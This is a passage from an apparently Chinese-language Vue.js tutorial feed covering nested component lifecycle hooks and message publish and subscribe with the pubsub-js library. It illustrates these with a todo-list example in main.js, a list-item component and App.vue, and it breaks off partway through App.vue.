</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;SubComponent&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeCreate</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;SubComponent beforeCreate...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">created</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;SubComponent created...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeMount</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;SubComponent beforeMount...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;SubComponent mounted...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeDestroy</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;SubComponent beforeDestroy...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">destroyed</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;SubComponent destroyed...&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>启动项目后，浏览器控制台输出内容如下：</p>
<pre tabindex="0"><code>App beforeCreate...
App created...
App beforeMount...
SubComponent beforeCreate...
SubComponent created...
SubComponent beforeMount...
SubComponent mounted...
App mounted...
App beforeDestroy...
SubComponent beforeDestroy...
SubComponent destroyed...
App destroyed...
</code></pre><p>从控制台的输出中可以看出，子组件的初始化及挂载流程（从<code>beforeCreate</code>到<code>mounted</code>）是在父组件挂载流程（从<code>beforeMount</code>到<code>mounted</code>）中完成的；子组件的销毁流程（从<code>beforeDestroy</code>到<code>destroyed</code>）是在父组件的卸载流程（从<code>beforeDestroy</code>到<code>destroyed</code>）中完成的。</p>
<p>嵌套的组件的生命周期可以用下图来表示：</p>
<p><picture><img class="img-fluid " alt="嵌套组件的生命周期" src="/docs/vue/components/life-cycle/components-life-cycle.png" loading="lazy" width="535" height="690" />
</picture>

</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 消息订阅与发布（pubsub-js）</title>
      <link>/docs/vue/components/pubsub-js/</link>
      <pubDate>Tue, 19 Sep 2023 10:59:34 +0000</pubDate>
      
      <guid>/docs/vue/components/pubsub-js/</guid>
      <description><![CDATA[Vue组件间的通信还可借助第三方库来实现。而pubsub-js就是一种实现了消息的订阅与发布的库。使用pubsub-js可以实现任意组件间的]]></description>
      <content:encoded><![CDATA[<p>Vue组件间的通信还可借助第三方库来实现。而<code>pubsub-js</code>就是一种实现了消息的订阅与发布的库。使用<code>pubsub-js</code>可以实现任意组件间的通信。</p>
<p>安装<code>pubsub-js</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">npm i pubsub-js
</span></span></code></pre></div><p>在需要发布或订阅消息的组件中引入<code>pubsub-js</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">pubsub</span> <span class="nx">from</span> <span class="s1">&#39;pubsub-js&#39;</span>
</span></span></code></pre></div><hr>
<h1 id="发布消息" data-numberify>发布消息<a class="anchor ms-1" href="#发布消息"></a></h1>
<p><code>pubsub-js</code>发布消息可以使用<code>pubsub.publish()</code>方法：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">pubsub</span><span class="p">.</span><span class="nx">publish</span><span class="p">(</span><span class="nx">msgName</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span>
</span></span></code></pre></div><ul>
<li><code>msgName</code>：发送消息的名称，字符串类型。</li>
<li><code>data</code>：发送的消息（数据），类型任意。</li>
</ul>
<blockquote>
<p>注：<code>pubsub.publish()</code>与<code>$bus.$emit()</code>方法不一样。<code>pubsub.publish()</code>仅有一个<code>data</code>参数作为消息进行发送。而<code>$bus.$emit()</code>的参数数量是可变的，从第2个开始的参数都可作为消息发送。</p>
</blockquote>
<hr>
<h1 id="订阅消息" data-numberify>订阅消息<a class="anchor ms-1" href="#订阅消息"></a></h1>
<p><code>pubsub-js</code>订阅消息可以使用<code>pubsub.subscribe()</code>方法：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">pubsub</span><span class="p">.</span><span class="nx">subscribe</span><span class="p">(</span><span class="nx">msgName</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span>
</span></span></code></pre></div><ul>
<li>
<p><code>msgName</code>：订阅的消息名称，字符串类型。</p>
</li>
<li>
<p><code>callback</code>：收到消息时，执行的回调函数。</p>
<p>当<code>pubsub.subscribe()</code>的回调函数使用一般的<code>function</code>形式定义时，回调函数中的<code>this</code>指向的是<code>undefined</code>。</p>
<p>而在Vue中定义的回调一般是Lambda表达式。所以使用Lambda表达式直接在<code>pubsub.subscribe()</code>中定义回调函数即可。</p>
</li>
<li>
<p>返回值：返回当前订阅的ID值。</p>
</li>
</ul>
<hr>
<h1 id="取消订阅" data-numberify>取消订阅<a class="anchor ms-1" href="#取消订阅"></a></h1>
<p><code>pubsub-js</code>取消订阅消息可以使用<code>pubsub.unsubscribe()</code>方法：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">pubsub</span><span class="p">.</span><span class="nx">unsubscribe</span><span class="p">(</span><span class="nx">subId</span><span class="p">)</span>
</span></span></code></pre></div><p><code>subId</code>：订阅的ID值。即，在调用<code>pubsub.subscribe()</code>时返回的ID值。</p>
<hr>
<h1 id="与全局事件总线的对比" data-numberify>与全局事件总线的对比<a class="anchor ms-1" href="#与全局事件总线的对比"></a></h1>
<ul>
<li>全局事件总线是Vue自带的一个模型，无需引入第三方库。</li>
<li>Pubsub是第三方库，其事件的订阅与发布无法在Vue开发者工具中查看。</li>
<li>全局事件总线的功能整体上与消息的订阅发布并无太大差别。</li>
</ul>
<hr>
<h1 id="挂载-pubsub" data-numberify>挂载 Pubsub<a class="anchor ms-1" href="#挂载-pubsub"></a></h1>
<p>使用Pubsub时，可以像安装全局事件总线时一样，将Pubsub挂载到Vue实例上，这样在组件中使用Pubsub时就无需多次重复引入Pubsub。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">pubsub</span> <span class="nx">from</span> <span class="s1">&#39;pubsub-js&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeCreate</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$pubsub</span> <span class="o">=</span> <span class="nx">pubsub</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span></code></pre></div><ul>
<li>
<p>发布消息：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$pubsub</span><span class="p">.</span><span class="nx">publish</span><span class="p">(</span><span class="nx">msgName</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span>
</span></span></code></pre></div><blockquote>
<p><code>this</code>指Vue组件实例，下同。</p>
</blockquote>
</li>
<li>
<p>订阅消息：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">subId</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">$pubsub</span><span class="p">.</span><span class="nx">subscribe</span><span class="p">(</span><span class="nx">msgName</span><span class="p">,</span> <span class="nx">callback</span><span class="p">)</span>
</span></span></code></pre></div></li>
<li>
<p>取消订阅</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="k">this</span><span class="p">.</span><span class="nx">$pubsub</span><span class="p">.</span><span class="nx">unsubscribe</span><span class="p">(</span><span class="nx">subId</span><span class="p">)</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h1 id="消息订阅发布案例" data-numberify>消息订阅发布案例<a class="anchor ms-1" href="#消息订阅发布案例"></a></h1>
<p>将<a href="../custom-events">组件自定义事件</a>中的<code>todo-list</code>案例修改成使用消息订阅与发布实现，并且增加了编辑功能。</p>
<blockquote>
<p>注：下方注释内容为<code>...</code>（即<code>&lt;!-- ... --&gt;</code>或<code>/* ... */</code>）的部分，代表与原先<a href="../custom-events">组件自定义事件</a>中的案例内容相同。</p>
</blockquote>
<h2 id="mainjs" data-numberify>main.js<a class="anchor ms-1" href="#mainjs"></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">pubsub</span> <span class="nx">from</span> <span class="s1">&#39;pubsub-js&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">render</span><span class="o">:</span> <span class="nx">h</span> <span class="p">=&gt;</span> <span class="nx">h</span><span class="p">(</span><span class="nx">App</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">  <span class="nx">beforeCreate</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$pubsub</span> <span class="o">=</span> <span class="nx">pubsub</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}).</span><span class="nx">$mount</span><span class="p">(</span><span class="s1">&#39;#app&#39;</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="todo-list-itmevue" data-numberify>todo-list-itme.vue<a class="anchor ms-1" href="#todo-list-itmevue"></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;checkbox&#34;</span> <span class="na">:checked</span><span class="o">=</span><span class="s">&#34;isCompleted&#34;</span> <span class="err">@</span><span class="na">change</span><span class="o">=</span><span class="s">&#34;handleCheck&#34;</span><span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">span</span> <span class="na">v-show</span><span class="o">=</span><span class="s">&#34;!isEdit&#34;</span><span class="p">&gt;</span>{{name}}<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> 
</span></span><span class="line"><span class="cl">      <span class="na">v-show</span><span class="o">=</span><span class="s">&#34;isEdit&#34;</span> 
</span></span><span class="line"><span class="cl">      <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="na">v-model</span><span class="err">.</span><span class="na">lazy</span><span class="o">=</span><span class="s">&#34;todoName&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="na">ref</span><span class="o">=</span><span class="s">&#34;input&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="err">@</span><span class="na">keyup</span><span class="err">.</span><span class="na">enter</span><span class="o">=</span><span class="s">&#34;handleBlur&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="err">@</span><span class="na">blur</span><span class="o">=</span><span class="s">&#34;handleBlur&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-danger&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;handleDelete&#34;</span><span class="p">&gt;</span>删除<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> 
</span></span><span class="line"><span class="cl">    <span class="na">v-show</span><span class="o">=</span><span class="s">&#34;!isEdit&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="na">class</span><span class="o">=</span><span class="s">&#34;btn btn-edit&#34;</span> 
</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;handleEdit&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    编辑
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;todo-list-item&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span><span class="cm">/* ... */</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">isEdit</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">todoName</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">get</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">name</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="nx">set</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">name</span><span class="p">.</span><span class="nx">trim</span><span class="p">())</span> <span class="k">return</span> <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;事件名称不能为空！&#39;</span><span class="p">)</span>  <span class="c1">// 控制输入不能为空
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">this</span><span class="p">.</span><span class="nx">$pubsub</span><span class="p">.</span><span class="nx">publish</span><span class="p">(</span><span class="s1">&#39;update-todo&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">name</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 勾选或取消勾选
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">handleCheck</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 通知 App.vue 将对应的 todo 对象的 isCompleted 取反
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">this</span><span class="p">.</span><span class="nx">$pubsub</span><span class="p">.</span><span class="nx">publish</span><span class="p">(</span><span class="s1">&#39;check-todo&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 删除
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">handleDelete</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">confirm</span><span class="p">(</span><span class="sb">`是否确定删除</span><span class="si">${</span><span class="k">this</span><span class="p">.</span><span class="nx">name</span><span class="si">}</span><span class="sb">？`</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">$pubsub</span><span class="p">.</span><span class="nx">publish</span><span class="p">(</span><span class="s1">&#39;remove-todo&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 进入编辑
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">handleEdit</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">isEdit</span> <span class="o">=</span> <span class="kc">true</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 模板重新解析完成后才自动获取焦点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// $nextTick() 指定的回调，会在下次DOM更新完成之后才执行
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">this</span><span class="p">.</span><span class="nx">$nextTick</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">$refs</span><span class="p">.</span><span class="nx">input</span><span class="p">.</span><span class="nx">focus</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">      <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 失去焦点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">handleBlur</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">isEdit</span> <span class="o">=</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="appvue" data-numberify>App.vue<a class="anchor ms-1" href="#appvue"></a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;root&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- ... --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">TodoHeader</span> <span class="nx">from</span> <span class="s1">&#39;./components/todo-header.vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">TodoFooter</span> <span class="nx">from</span> <span class="s1">&#39;./components/todo-footer.vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">TodoMain</span> <span class="nx">from</span> <span class="s1">&#39;./components/todo-main.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;App&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">components</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">TodoHeader</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">TodoFooter</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">TodoMain</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 将 todos 列表定义在 App.vue 中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">todos</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;todos&#39;</span><span class="p">))</span> <span class="o">||</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">      <span class="nx">subIds</span><span class="o">:</span> <span class="p">{},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">watch</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">todos</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">deep</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">handler</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span><span class="cm">/* ... */</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 计算被选 todo 的总数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">completedTotal</span><span class="p">()</span> <span class="p">{</span><span class="cm">/* ... */</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 计算 todos 总数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">total</span><span class="p">()</span> <span class="p">{</span><span class="cm">/* ... */</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 添加一个 todo
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">addTodo</span><span class="p">(</span><span class="nx">todo</span><span class="p">)</span> <span class="p">{</span><span class="cm">/* ... */</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 勾选或取消一个 todo（使用 &#39;_&#39; 作为冗余参数的占位符）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">checkTodo</span><span class="p">(</span><span class="nx">_</span><span class="p">,</span> <span class="nx">id</span><span class="p">)</span> <span class="p">{</span><span class="cm">/* ... */</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 删除一个 todo（使用 &#39;_&#39; 作为冗余参数的占位符）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">deleteTodo</span><span class="p">(</span><span class="nx">_</span><span class="p">,</span> <span class="nx">id</span><span class="p">)</span> <span class="p">{</span><span class="cm">/* ... */</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 选择所有或取消选择所有
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">checkAllTodo</span><span class="p">(</span><span class="nx">checked</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">todos</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">todo</span> <span class="p">=&gt;</span> <span class="nx">todo</span><span class="p">.</span><span class="nx">isCompleted</span> <span class="o">=</span> <span class="nx">checked</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 清除所有已完成的 todo
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">clearAllCompletedTodos</span><span class="p">()</span> <span class="p">{</span><span class="cm">/* ... */</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">mounted</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">subIds</span><span class="p">.</span><span class="nx">checkTodo</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">$pubsub</span>
</span></span><span class="line"><span class="cl">                                <span class="p">.</span><span class="nx">subscribe</span><span class="p">(</span><span class="s1">&#39;check-todo&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">checkTodo</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="p">.</span><span class="nx">subIds</span><span class="p">.</span><span class="nx">removeTodo</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">$pubsub</span>
</span></span><span class="line"><span class="cl">                                <span class="p">.</span><span class="nx">subscribe</span><span class="p">(</span><span class="s1">&#39;remove-todo&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">deleteTodo</span><span class="p">)</span>
